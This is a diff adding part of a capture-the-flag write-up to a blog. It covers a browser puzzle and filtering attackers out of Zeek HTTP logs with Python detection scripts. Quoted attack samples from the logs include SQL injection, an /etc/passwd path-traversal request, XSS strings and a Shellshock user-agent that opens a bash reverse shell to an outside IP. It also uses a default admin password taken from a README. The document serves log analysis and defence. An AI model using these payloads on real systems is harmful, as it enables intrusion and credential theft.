@@ -1247,8 +1247,7 @@ for timestamp in range(1575658800, 1575666000):
         pass
 {% endhighlight %}
 
-
-
+The encrypted file is a quick-start guide of the *Machine Learning Sleigh Route Finder*; check it out, that could be interesting.
 
 ### Open the Sleigh Shop Door
 
@@ -1289,3 +1288,285 @@ What the heck is that? Well, if you simply search for "macaroni" in the HTML doc
 {% endhighlight %}
 In the DOM view, drag-and-drop this div into the last lock (where the cover used to be), and validate it again. You'll then see another error message (*Missing cotton swab!*).
 Repeat the same procedure with the swab, then the gnome, and you'll be done with this challenge!
+
+### Filter Out Poisoned Sources of Weather Data
+
+>Use the data supplied in the [Zeek JSON logs](https://downloads.elfu.org/http.log.gz) to identify the IP addresses of attackers poisoning Santa's flight mapping software. [Block the 100 offending sources of information to guide Santa's sleigh through the attack](https://srf.elfu.org/). Submit the Route ID ("RID") success value that you're given. For hints on achieving this objective, please visit the Sleigh Shop and talk with Wunorse Openslae.
+
+After talking to Wunorse Openslae, we understand that this last challenge actually has two steps:
+* The first step is to manage to log into the [Sleigh Route Finder Admin Console]((https://srf.elfu.org/)
+* The second step will be to identify the IP of attackers (there should be 100 IPs), and block them
+
+Wunorse advises us to use `jq` to go through the logs. I guess it's possible to complete this challenge only using `jq`, but as there will be some "complex" queries to do, I'd rather use a tool I know. So let's stick with `python` for this last challenge!
+
+After looking at the logs (and especially at the different values of the field `uri`), we can see roughly three different categories of requests:
+* people using an API (`uri` starts with `/api/weather`), to either GET or POST some weather data;
+* people trying to access random stuff (and receiving an HTTP status code 404 as a response)
+* people logging in or out, or accessing existing resources
+
+Another thing that might strike you quickly is that most of the IPs are used only once! As a first step, we'd like to get the logs of someone who managed to log-in, then to perform some actions. So we expect to see at least a couple of IPs with two requests (one to `/api/login`, and one to something else). Let's try to list the IPs used in several requests:
+
+{% highlight python %}
+import json
+
+ips = set()
+with open("http.log","r") as file:
+    logs = json.loads(file.read())
+
+    for log in logs:
+        ip = log["id.orig_h"]
+        if ip in ips:
+            print("IP used multiple times: %s" % (ip))
+        else:
+            ips.add(ip)
+
+# Result:
+# IP used multiple times: 42.103.246.130
+# IP used multiple times: 42.103.246.130
+# IP used multiple times: 42.103.246.130
+# IP used multiple times: 228.145.238.81
+{% endhighlight %}
+
+Wow! Only 2 IPs are used several times! If we look at the activity of the first IPs, you'll see that the first request is a GET to `/README.md`. This might ring a bell if you've carefully read the quick-start guide decrypted 2 challenges ago. In this file, we could read:
+
+> The default login credentials should be changed on startup and can be found in the readme in the ElfU Research Labs git repository
+
+The [readme file](https://srf.elfu.org/README.md) read by `42.103.246.130` is indeed the file mentioned in the quick-start guide, and of course the default login credentials are still valid! We can now log into the [Sleigh Route Finder Admin Console]((https://srf.elfu.org/) using the default login/password admin/924158F9522B3744F5FCD4D10FAC4356.
+
+The second step is to identify the attackers' IPs. We were told by Wunorse that there are (at least) four different attack methods that can be found in the logs:
+* SQL injection: we can indeed see some events with suspicious field values, such as `"uri": "/api/weather?station_id=1' UNION SELECT 0,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 FROM xmas_users WHERE 1"`
+* Local file inclusion: similarily, we can see that some user tried access `/api/weather?station_id=\"/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd`
+* Cross-site scripting: the classic way to test for XSS flaws is to use the browser's [`alert`](https://developer.mozilla.org/en-US/docs/Web/API/Window/alert) function; and indeed, we can see a request sent to `/logout?id=<script>alert(1400620032)</script>&ref_a=avdsscanning\\\"><script>alert(1536286186)</script>`
+* Shellshock: we can also spot the infamous Shellshock payload `() { :; };` in a couple of requests; for instance, the one sent with user-agent `() { :; }; /bin/bash -i >& /dev/tcp/31.254.228.4/48051 0>&1`
+
+So we indeed found some examples for each of these attack. Let's now try to scan all the logs, and apply some easy heuristics to identify the IP that have been used to send an attack. It's important not to look only at the field `uri`, but to look at all fields: most of the fields from zeek logs are extracted from client-controlled fields of the HTTP request, and we can expect attackers to try to inject malicious payload in any client-controlled field.
+
+{% highlight python %}
+import json
+
+ips = {}
+attacks_by_type = {}
+def report(ip, attack, field, log):
+    if ip not in ips:
+        ips[ip] = ""
+
+    ips[ip] += "%s in field %s (value: %s). " % (attack, field, log[field])
+
+    if attack not in attacks_by_type:
+        attacks_by_type[attack] = 0
+    attacks_by_type[attack] += 1
+
+with open("http.log","r") as file:
+    logs = json.loads(file.read())
+
+    for log in logs:
+        ip = log["id.orig_h"]
+        user_agent = log["user_agent"]
+
+        for field in log:
+            log[field] = str(log[field])
+
+            # SQLi
+            if "SELECT" in log[field] or "UNION" in log[field] or "1=1" in log[field]:
+                report(ip, "SQL injection", field, log)
+
+            # LFI
+            if ".." in log[field] or "/etc/passwd" in log[field]:
+                report(ip, "LFI", field, log)
+
+            # XSS
+            if "alert(" in log[field]:
+                report(ip, "XSS", field, log)
+
+            # Shellshock
+            if "()" in log[field]:
+                report(ip, "Shellshock", field, log)
+
+for ip in ips:
+    print("%s: %s" % (ip, ips[ip]))
+
+print("%i suspicious IPs found:" % len(ips))
+print(", ".join(ips))
+print("")
+print("Summary: " + repr(attacks_by_type))
+
+# Output:
+# 42.103.246.250: SQL injection in field uri (value: /api/weather?station_id=1' UNION SELECT NULL,NULL,NULL--).
+# 56.5.47.137: XSS in field uri (value: /logout?id=<script>alert(1400620032)</script>&ref_a=avdsscanning\"><script>alert(1536286186)</script>).
+# ...
+# 102.143.16.184: LFI in field uri (value: /api/weather?station_id="/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd).
+# ...
+# 31.254.228.4: Shellshock in field user_agent (value: () { :; }; /bin/bash -i >& /dev/tcp/31.254.228.4/48051 0>&1).
+# ...
+# 61.110.82.125: XSS in field host (value: <script>alert(\"automatedscanning\");</script>).
+# ...
+# 62 suspicious IPs found:
+# 42.103.246.250, 56.5.47.137, ...
+{% endhighlight %}
+
+So 62 distinct IPs were detected as potential attacker's IP. For each of these IPs, we log the request that was flagged as an attack; you can review them if you want, and you'll see that all of them are definitely attacks, i.e. we don't have false positives in this list.
+
+Still, we only have 62 addresses. Wunorse advised us to start from the events identified as malicious, and to pivot off other attributes in that event to find IPs using similar values. Among the other attributes, I first thought about the `uid`. According to [Zeek's documentation](https://docs.zeek.org/en/stable/examples/logs/#using-uids):
+> As a connection is processed by Zeek, a unique identifier is assigned to each session.
+
+I honestly don't know what is the "session" mentioned by Zeek's documentation. I would assume it's the TLS session, but I'm not 100% sure. In such a case, I would expect very few duplicates in the `uid` from our logs. But it turns out that if you list the UIDs used by attackers, and then flag as suspicious any IP that used one of these `uid`s, you'll end up with 719 suspicious IPs! So that's probably not the good field to pivot off. I don't know if that's due to the simulated data, or if I was just wrong about the meaning of this field though...
+
+Moving on, we can have a look at another field: the `user_agent`. When we look at the `user-agent` of some of the 62 identified malicious requests, we can spot some (more or less) subtle typos here and there:
+* value: Mozilla/4.0 (compatible; MSIE6.0; Windows NT 5.1) (*no space between MSIE and its version number*)
+* Mozilla/4.0 (compatibl; MSIE 7.0; Windows NT 6.0; Trident/4.0; SIMBAR={7DB0F6DE-8DE7-4841-9084-28FA914B0F2E}; SLCC1; .N (*no -e at the end of "compatibl"*)
+* Mozilla/5.0 (compatible; Goglebot/2.1; +http://www.google.com/bot.html) (*only one O in Goglebot*)
+Once again, I don't know how realistic this is though, but that may allow us to detect a few IPs that may use the same user-agents, and we'll flag them as suspicious as well.
+
+For that, we'll modify our previous script to keep track of the user-agent of the 62 first malicious requests, during the first scan of the logs. We'll then do a second scan, and whenever a request uses a user-agent that we've tracked during the first scan, we'll mark the request as suspicious.
+
+{% highlight python %}
+import json
+
+ips = {}
+attacks_by_type = {}
+attackers_user_agents = set()
+def report(ip, attack, field, log):
+    if ip not in ips:
+        ips[ip] = ""
+
+    ips[ip] += "%s in field %s (value: %s). " % (attack, field, log[field])
+
+    if attack not in attacks_by_type:
+        attacks_by_type[attack] = 0
+    attacks_by_type[attack] += 1
+
+    attackers_user_agents.add(log["user_agent"])
+
+
+with open("http.log","r") as file:
+    logs = json.loads(file.read())
+
+    for log in logs:
+        ip = log["id.orig_h"]
+        user_agent = log["user_agent"]
+
+        for field in log:
+            log[field] = str(log[field])
+
+            # SQLi
+            if "SELECT" in log[field] or "UNION" in log[field] or "1=1" in log[field]:
+                report(ip, "SQL injection", field, log)
+
+            # LFI
+            if ".." in log[field] or "/etc/passwd" in log[field]:
+                report(ip, "LFI", field, log)
+
+            # XSS
+            if "alert(" in log[field]:
+                report(ip, "XSS", field, log)
+
+            # Shellshock
+            if "()" in log[field]:
+                report(ip, "Shellshock", field, log)
+
+with open("http.log","r") as file:
+    logs = json.loads(file.read())
+
+    for log in logs:
+        ip = log["id.orig_h"]
+        user_agent = log["user_agent"]
+
+        if ip not in ips and user_agent in attackers_user_agents:
+            report(ip, "user agent used by attacker", "user_agent", log)
+
+
+for ip in ips:
+    print("%s: %s" % (ip, ips[ip]))
+
+print("%i suspicious IPs found:" % len(ips))
+print(", ".join(ips))
+print("")
+print("Summary: " + repr(attacks_by_type))
+
+# Output:
+# 143 suspicious IPs found
+{% endhighlight %}
+
+143 IPs; that's too much. If we start looking at the new IPs that we flagged, we'll see that some of them actually use a genuine user-agent. We've indeed been too aggressive, and we oversaw the fact that some attackers might have used legit user-agents; we cannot blacklist a user-agent just because an attacker used it!
+
+In order to avoid blocking popular user-agents used by attacker, we'll add one final bit of code in our script:
+* During the first scan, we'll count the number of requests by user-agent
+* During the second scan, we'll only flag an IP as suspicious if it uses an user-agent used by an attacker, and only two IPs used this user-agent (including the attacker's IP that was already identified during the first scan)
+
+Here's the final version of our script:
+
+{% highlight python %}
+import json
+
+ips = {}
+attacks_by_type = {}
+attackers_user_agents = set()
+def report(ip, attack, field, log):
+    if ip not in ips:
+        ips[ip] = ""
+
+    ips[ip] += "%s in field %s (value: %s). " % (attack, field, log[field])
+
+    if attack not in attacks_by_type:
+        attacks_by_type[attack] = 0
+    attacks_by_type[attack] += 1
+
+    attackers_user_agents.add(log["user_agent"])
+
+
+requests_by_user_agent = {}
+with open("http.log","r") as file:
+    logs = json.loads(file.read())
+
+    for log in logs:
+        ip = log["id.orig_h"]
+        user_agent = log["user_agent"]
+
+        for field in log:
+            log[field] = str(log[field])
+
+            # SQLi
+            if "SELECT" in log[field] or "UNION" in log[field] or "1=1" in log[field]:
+                report(ip, "SQL injection", field, log)
+
+            # LFI
+            if ".." in log[field] or "/etc/passwd" in log[field]:
+                report(ip, "LFI", field, log)
+
+            # XSS
+            if "alert(" in log[field]:
+                report(ip, "XSS", field, log)
+
+            # Shellshock
+            if "()" in log[field]:
+                report(ip, "Shellshock", field, log)
+
+        if user_agent not in requests_by_user_agent:
+            requests_by_user_agent[user_agent] = 0
+        requests_by_user_agent[user_agent] += 1
+
+with open("http.log","r") as file:
+    logs = json.loads(file.read())
+
+    for log in logs:
+        ip = log["id.orig_h"]
+        user_agent = log["user_agent"]
+
+        if ip not in ips and user_agent in attackers_user_agents and requests_by_user_agent[user_agent] < 3:
+            report(ip, "rare user agent used by attacker", "user_agent", log)
+
+
+for ip in ips:
+    print("%s: %s" % (ip, ips[ip]))
+
+print("%i suspicious IPs found:" % len(ips))
+print(", ".join(ips))
+print("")
+print("Summary: " + repr(attacks_by_type))
+
+# Output:
+# 97 suspicious IPs found:
+{% endhighlight %}
+
+97 IPs! That looks close enough to 100. And indeed, by blocking these 97 IPs, we unblock the SRF!
+We can now head into the final room and enjoy the credits (... and don't miss on the [cliffhanger](https://downloads.elfu.org/LetterOfWintryMagic.pdf) lying in the upper left corner !)
